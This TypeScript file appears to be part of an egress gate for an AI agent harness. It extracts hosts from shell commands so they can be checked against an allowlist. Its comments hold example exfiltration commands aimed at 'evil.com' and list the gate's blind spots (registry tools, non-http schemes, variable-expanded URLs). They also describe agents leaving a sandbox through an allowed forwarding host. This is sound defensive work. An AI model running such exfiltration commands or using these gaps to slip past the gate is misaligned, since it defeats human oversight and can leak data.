/**
 * kit exec-broker — conservative network-target extraction.
 *
 * The egress-gate inspects a pending Bash
 * command for its network targets. Two passes, both deliberately CONSERVATIVE (a false positive
 * would wrongly deny legitimate work, so we only extract high-confidence targets):
 *
 *   1. Explicit `http(s)://` URLs, parsed via the WHATWG URL parser.
 *   2. Scheme-less hosts passed as the POSITIONAL argument to a known fetch tool (`curl` /
 *      `wget`) — e.g. `curl evil.com/exfil`, `wget evil.com`. curl/wget treat a bare positional
 *      as a URL, so it IS a real network target; without this pass the egress allowlist was not
 *      enforced for the most common egress form (a fail-open the bug sweep flagged). Value-taking
 *      flags (`-o out.txt`, `-H`, `-d @data.json`, …) are skipped so their arguments are never
 *      mistaken for hosts, and a token is only taken when it matches a strict domain shape.
 *
 *   3. The host targets of network tools that take a bare host (`nc`, `ping`, `nmap`, `ssh`,
 *      `dig`, `openssl s_client -connect`, `Test-NetConnection`, …), and a bare address or
 *      `localhost` given to `curl`/`wget`, read only in the tool's target position
 *      (broker/bare-hosts.ts). curl's URL globbing (`10.0.0.[1-5]`, `h{a,b}.example`) is
 *      expanded into its targets there (broker/curl-glob.ts).
 *
 * Still an HONEST LIMITATION, not a complete boundary: implicit-registry tools (`git`, `npm`,
 * `pip`), non-http(s) schemes, and variable-expanded URLs (`curl $HOST`) remain out of reach —
 * command-string inspection is defense-in-depth, pair it with a network sandbox for a hard
 * boundary. Pure + deterministic: same command → same hosts (unique, sorted).
 */

import { addBareToolHosts, addBareToolHostsFromArgs, fetchTakesValue } from "./bare-hosts.js";
import { expandCurlGlob } from "./curl-glob.js";

const URL_RE = /https?:\/\/[^\s"'`<>\\)\];]+/gi;

/** Tools whose bare positional argument is a URL/host even without a scheme. Registry/implicit-
 *  network tools (git/npm/pip) are intentionally excluded — their targets are implicit and
 *  treating a bare arg as a host would over-block. ssh/scp and the like are read by
 *  broker/bare-hosts.ts, in their own target positions. */
const FETCH_TOOLS = new Set(["curl", "wget"]);

/** Strict domain shape: ≥2 dot-separated labels + an alpha TLD, optional :port and /path. A
 *  scheme (`x://…`) never matches — those are handled by URL_RE. */
const HOST_RE = /^(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z]{2,}(?::\d+)?(?:\/\S*)?$/i;

/** basename of a command token (`/usr/bin/curl` → `curl`). */
function basename(tok: string): string {
  const i = tok.lastIndexOf("/");
  return i === -1 ? tok : tok.slice(i + 1);
}

/** Normalize a bare host token to a lowercase hostname via the URL parser, or null. */
function hostOf(token: string): string | null {
  if (!HOST_RE.test(token)) return null;
  try {
    const h = new URL("http://" + token).hostname;
    return h.length > 0 ? h.toLowerCase() : null;
  } catch {
    return null;
  }
}

/** Scheme-less hosts that are positional args to a curl/wget in the command (pass 2). */
function extractFetchHosts(command: string, hosts: Set<string>): void {
  // Split into command segments on shell separators so `curl a.com;echo` doesn't bleed.
  for (const segment of command.split(/&&|\|\||[;\n|&]/)) {
    const tokens = segment.trim().split(/\s+/).filter(Boolean);
    let fetchTool: string | undefined;
    let skipNext = false;
    for (const tok of tokens) {
      if (!fetchTool) {
        if (FETCH_TOOLS.has(basename(tok))) fetchTool = basename(tok);
        continue; // the tool token itself is never a host
      }
      if (skipNext) {
        skipNext = false;
        continue; // this is a value-flag's argument — not a host
      }
      if (tok.startsWith("-")) {
        // `--flag=value` carries its value inline (one token) — nothing to skip after it.
        if (fetchTakesValue(fetchTool, tok)) skipNext = true;
        continue;
      }
      const h = hostOf(tok);
      if (h) hosts.add(h);
    }
  }
}

/**
 * The hosts a URL's hostname names. `{a,b}.example` names a.example and b.example (curl's glob,
 * the shell's braces), not the literal, which kept an in-scope pair from passing. A brace left
 * open (`h.example{` from `https://h.example{/a,/b}`) belongs to a pattern that goes on past the
 * host; curl's own reading of it (bare-hosts.ts) expands it whole. A pattern too large to expand
 * is kept as it is, and no scope entry matches it.
 */
function urlHostNames(host: string): string[] {
  if (!/[{}]/.test(host)) return host ? [host] : [];
  if (host.split("{").length !== host.split("}").length) return [];
  return expandCurlGlob(host) ?? [host];
}

/**
 * Add a URL's host, and the hosts of URLs nested in its path, query or fragment
 * (`https://mirror/fetch?url=https://elsewhere/`, encoded or not). An allowed host that forwards a
 * request is how agents left a sandbox with no direct internet (kit-research
 * `gpt-6-astra-swarm-incident-vs-kit`), so a forwarded target is checked against the scope too.
 * Bounded depth. A scheme-less host in a parameter is not seen.
 */
function addUrlHosts(raw: string, hosts: Set<string>, depth = 0): void {
  let u: URL;
  try {
    u = new URL(raw);
  } catch {
    return; // not a parseable URL after all — skip (conservative: never guess)
  }
  for (const h of urlHostNames(u.hostname.toLowerCase())) hosts.add(h);
  if (depth >= 2) return;
  const rest = `${u.pathname}${u.search}${u.hash}`;
  let decoded = rest;
  try {
    decoded = decodeURIComponent(rest);
  } catch {
    /* malformed escape: scan the raw text */
  }
  for (const text of new Set([rest, decoded])) {
    for (const nested of text.match(URL_RE) ?? []) addUrlHosts(nested, hosts, depth + 1);
  }
}

/** Unique, sorted, lowercased hostnames of every network target in a shell command. */
export function extractHostsFromCommand(command: string): string[] {
  const hosts = new Set<string>();
  for (const match of command.match(URL_RE) ?? []) addUrlHosts(match, hosts);
  extractFetchHosts(command, hosts);
  addBareToolHosts(command, hosts);
  return [...hosts].sort();
}

/** Parse complete argument URLs before the fallback for embedded text. */
function extractArgumentUrls(arg: string, hosts: Set<string>): void {
  const start = arg.search(/https?:\/\//i);
  if (start < 0) return;
  // Complete argv values are URLs, not shell text. Keep IPv6 and userinfo intact.
  if (URL.canParse(arg.slice(start))) return addUrlHosts(arg.slice(start), hosts);
  // Embedded code or prose can contain URLs without being a URL itself.
  for (const match of arg.match(URL_RE) ?? []) addUrlHosts(match, hosts);
}

/** Inspect the arguments that execute, independently of their display or shell quoting. */
export function extractHostsFromArgs(args: readonly string[]): string[] {
  const hosts = new Set<string>();
  for (const arg of args) extractArgumentUrls(arg, hosts);
  const tool = basename((args[0] ?? "").replaceAll("\\", "/")).replace(/\.exe$/i, "");
  if (FETCH_TOOLS.has(tool)) {
    let skipNext = false;
    for (const arg of args.slice(1)) {
      if (skipNext) {
        skipNext = false;
        continue;
      }
      if (arg.startsWith("-")) {
        skipNext = fetchTakesValue(tool, arg);
        continue;
      }
      const host = hostOf(arg);
      if (host) hosts.add(host);
    }
  }
  addBareToolHostsFromArgs(args, hosts);
  return [...hosts].sort();
}
